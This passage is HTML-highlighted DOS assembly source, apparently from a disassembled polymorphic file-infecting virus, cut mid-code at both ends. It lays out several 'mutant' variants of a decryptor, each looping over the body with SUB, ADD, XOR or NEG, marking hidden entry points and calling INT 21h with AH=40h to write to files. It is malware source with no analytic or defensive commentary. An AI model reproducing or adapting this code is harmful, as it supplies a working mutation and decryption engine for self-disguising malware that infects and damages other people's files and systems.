                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">11C4h</span><span class="sc0">                </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; DS =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">; CX = 11C3</span><span class="sc0">
</span><span class="sc5">J03C28</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">00FEh</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03C28</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; SI =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">008Dh</span><span class="sc0">                </span><span class="sc1">; SI =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03C1A</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc4">,</span><span class="sc5">mut_23</span><span class="sc0">

</span><span class="sc5">J03C42</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                   </span><span class="sc1">; AH = 40h !!!!!!!</span><span class="sc0">
</span><span class="sc5">J03C47</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc4">,</span><span class="sc5">MUT_23</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03C17</span><span class="sc0">
</span><span class="sc5">END_23</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 27 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_27</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; cx=2385 -&gt; 11c3</span><span class="sc0">
</span><span class="sc5">J03C52</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03C52</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03C8D</span><span class="sc0">

        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03C63</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03C67</span><span class="sc0">
</span><span class="sc5">J03C66</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03C67</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">10C3h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc0">
</span><span class="sc5">J03C74</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03C74</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">008Dh</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03C66</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc4">,</span><span class="sc5">mut_27</span><span class="sc0">

</span><span class="sc5">J03C8D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">2567h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">

</span><span class="sc5">J03C93</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03C63</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( MUTANT # 24 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_24</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0EE3Eh</span><span class="sc0">               </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03CA7</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">43h</span><span class="sc0">
</span><span class="sc5">J03C9F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03C9F</span><span class="sc0">
</span><span class="sc5">J03CA6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03CA7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03C9F</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03CCE</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">12H</span><span class="sc0">

        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03CAF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03CDD</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0DC60h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03C9F</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2433</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03CA6</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">,</span><span class="sc5">mut_24</span><span class="sc0">
                </span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc5">J03CCE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">,</span><span class="sc5">mut_24</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03CAF</span><span class="sc0">

</span><span class="sc5">J03CDD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J03CDF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 28)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_28</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3246h</span><span class="sc0">                </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03CF3</span><span class="sc0">

</span><span class="sc5">J03CEA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03CEA</span><span class="sc0">
</span><span class="sc5">J03CF2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J03CF3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03CEA</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03D18</span><span class="sc0">
</span><span class="sc5">J03CF9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03D29</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ZweiByte</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03CEA</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2433</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03CF2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">,</span><span class="sc5">mut_28</span><span class="sc0">

</span><span class="sc5">J03D18</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; AH = 40h</span><span class="sc0">
                </span><span class="sc5">CALL_INT21</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">,</span><span class="sc5">mut_28</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03CF9</span><span class="sc0">

</span><span class="sc5">J03D29</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J03D2B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 26)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_26</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0EE3Ch</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J03D39</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03D39</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03D6C</span><span class="sc0">

</span><span class="sc5">J03D44</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J03D46</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03D47</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03D44</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC5Dh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">11C1h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J03D55</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03D55</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0092h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03D46</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">CALL_ENTRY</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc4">,</span><span class="sc5">mut_26</span><span class="sc0">
                </span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc5">J03D6C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1466h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1100h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03D47</span><span class="sc0">

</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #1 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_1</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">11C4h</span><span class="sc0">                </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J03D85</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03D85</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03DB9</span><span class="sc0">

</span><span class="sc5">J03D8F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J03D92</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
</span><span class="sc5">J03D93</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03D8F</span><span class="sc0">                  </span><span class="sc1">; BX =</span><span class="sc0">
</span><span class="sc5">J03D98</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23A3h</span><span class="sc0">                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">11C1h</span><span class="sc0">                </span><span class="sc1">; CX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J03DA1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
